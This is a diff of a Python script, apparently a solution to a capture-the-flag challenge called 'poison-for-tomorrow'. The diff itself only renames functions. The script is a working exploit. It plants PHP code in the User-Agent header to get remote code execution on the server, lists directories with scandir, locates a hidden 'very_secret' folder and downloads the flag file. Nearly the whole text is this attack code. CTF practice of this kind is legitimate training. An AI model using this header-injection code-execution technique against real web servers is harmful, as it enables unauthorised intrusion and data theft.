@@ -5,18 +5,18 @@ _url_base = 'https://poison-for-tomorrow.secchallenge.crysys.hu'
 
 
 def solve():
-    files = _get_remote_dir('.')
+    files = get_remote_dir('.')
     dir_name = re.search('very_secret.*', files).group()
-    assert('flag' in _get_remote_dir(dir_name).split('\n'))
+    assert('flag' in get_remote_dir(dir_name).split('\n'))
     flag = requests.get(f'{_url_base}/{dir_name}/flag').text
     return flag
 
 
-def _get_remote_dir(folder):
-    return _rce(f'foreach (scandir("{folder}") as $x) echo $x."\\n";')
+def get_remote_dir(folder):
+    return rce(f'foreach (scandir("{folder}") as $x) echo $x."\\n";')
 
 
-def _rce(cmd):
+def rce(cmd):
     headers = {
         'User-Agent': f'<?php echo "qqqqq"; {cmd} echo "qqqqq\\n";?>',
     }
